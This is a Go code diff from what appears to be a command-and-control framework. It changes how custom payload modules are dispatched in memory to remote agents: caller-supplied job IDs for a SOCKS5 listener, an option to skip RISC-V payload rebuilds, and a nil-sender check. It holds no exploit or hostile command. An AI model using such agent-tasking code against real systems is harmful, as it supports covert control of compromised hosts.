@@ -38,6 +38,13 @@ func moduleCustom(ctx *c2context.C2Context) {
 // moduleCustomWithJob dispatches a custom module and returns the job ID that
 // carries the payload command, or "" when nothing was dispatched.
 func moduleCustomWithJob(ctx *c2context.C2Context) string {
+	return moduleCustomWithJobID(ctx, "")
+}
+
+// moduleCustomWithJobID dispatches a custom module under a caller-chosen job ID.
+// An empty jobID generates a fresh one; a caller that supplies one (the SOCKS5
+// listener uses the proxy stream token) keys the result stream itself.
+func moduleCustomWithJobID(ctx *c2context.C2Context, jobID string) string {
 	// We might still need live.ActiveModule for metadata like Name
 	// But Options come from ctx.Flags
 	if live.ActiveModule == nil {
@@ -117,10 +124,6 @@ func moduleCustomWithJob(ctx *c2context.C2Context) string {
 			logging.Errorf("Running %s as RISC-V on %s: %v", config.Name, ctx.Target.Tag, err)
 			return ""
 		}
-		if err := buildRiscvPayload(config, ctx.Flags); err != nil {
-			logging.Errorf("Running %s as RISC-V: %v", config.Name, err)
-			return ""
-		}
 		native := config.AgentConfig.Files[0]
 		archVariants := false
 		for _, f := range config.AgentConfig.Files {
@@ -133,17 +136,25 @@ func moduleCustomWithJob(ctx *c2context.C2Context) string {
 			native = selectArchPayload(config.AgentConfig.Files, agentArch(ctx))
 		}
 		rvFile := riscvPayloadPath(native)
+		// A caller that dispatches the same module repeatedly (the SOCKS5
+		// listener runs one CONNECT at a time) can pre-build the guest and ask
+		// to skip the compile; an operator --riscv run always rebuilds.
+		if !(flagEnabled(ctx.Flags["skip_rv_build"]) && util.IsFileExist(filepath.Join(config.Path, rvFile))) {
+			if err := buildRiscvPayload(config, ctx.Flags); err != nil {
+				logging.Errorf("Running %s as RISC-V: %v", config.Name, err)
+				return ""
+			}
+		}
 		if !util.IsFileExist(filepath.Join(config.Path, rvFile)) {
 			logging.Errorf("Running %s as RISC-V: %s was not produced by the build (add rv_build.sh or make the Makefile emit it)", config.Name, rvFile)
 			return ""
 		}
 		logging.Infof("Running %s as a RISC-V BOF (%s)", config.Name, rvFile)
-		handleInMemoryModule(ctx, *config, "rv", invocation, peerIP, &payloadOverride{
+		return handleInMemoryModule(ctx, *config, "rv", invocation, peerIP, jobID, &payloadOverride{
 			file:   rvFile,
 			hosted: strings.ToLower(config.Name) + ".rv",
 			typ:    "rv",
 		}, &dep)
-		return ""
 	}
 
 	// A previous --riscv run compiled this module's sources for RV32 in place.
@@ -205,7 +216,7 @@ func moduleCustomWithJob(ctx *c2context.C2Context) string {
 
 	// Every agent module runs in memory; there is no on-disk/fork-and-run
 	// path. handleInMemoryModule re-encodes the invocation for the agent.
-	return handleInMemoryModule(ctx, *config, payload_type, invocation, peerIP, nil, loaderDep)
+	return handleInMemoryModule(ctx, *config, payload_type, invocation, peerIP, jobID, nil, loaderDep)
 }
 
 // moduleFilesMissing reports whether any payload the module declares is not
@@ -396,7 +407,7 @@ func buildRiscvPayload(config *def.ModuleConfig, flags map[string]string) error 
 	return nil
 }
 
-func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type string, invocation def.ResolvedInvocation, peerIP string, override *payloadOverride, dep *hostedDependency) string {
+func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type string, invocation def.ResolvedInvocation, peerIP, jobID string, override *payloadOverride, dep *hostedDependency) string {
 	if len(config.AgentConfig.Files) == 0 {
 		logging.Errorf("No files found for module %s in %s", config.Name, config.Path)
 		return ""
@@ -514,8 +525,14 @@ func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, pay
 	if peerIP != "" {
 		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
 	}
-	jobID := uuid.NewString()
+	if jobID == "" {
+		jobID = uuid.NewString()
+	}
 	logging.Debugf("Sending command %s to %s", cmd, ctx.Target.Tag)
+	if CmdSender == nil {
+		logging.Errorf("No command sender for module %s", config.Name)
+		return ""
+	}
 	if err := CmdSender(cmd, jobID, ctx.Target.Tag); err != nil {
 		logging.Errorf("Sending command %s to %s: %v", cmd, ctx.Target.Tag, err)
 		return ""
